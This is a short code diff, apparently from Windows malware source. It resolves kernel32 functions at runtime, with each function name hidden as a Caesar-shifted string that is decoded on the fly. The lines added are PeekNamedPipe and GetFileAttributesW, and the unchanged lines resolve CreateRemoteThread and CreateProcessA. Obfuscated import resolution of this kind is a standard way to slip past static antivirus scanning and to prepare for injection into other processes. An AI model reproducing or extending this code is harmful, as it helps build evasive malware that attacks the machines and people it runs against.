@@ -19,6 +19,8 @@ void InitApis() {
 
 	Api.GetProcAddress = (TGetProcAddress)my_GetProcAddress(hKernel32, CAESAR_DECRYPT("LjyUwthFiiwjxx"));
 	Api.LoadLibraryA = (TLoadLibraryA)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("QtfiQngwfw~F"));
+	Api.PeekNamedPipe = (TPeekNamedPipe)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("UjjpSfrjiUnuj"));
+	Api.GetFileAttributesW = (TGetFileAttributesW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("LjyKnqjFyywngzyjx\\"));
 	Api.CreateRemoteThread = (TCreateRemoteThread)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjWjrtyjYmwjfi"));
 	Api.CreateProcessA = (TCreateProcessA)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjUwthjxxF"));
 	Api.CreateFileA = (TCreateFileA)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjKnqjF"));
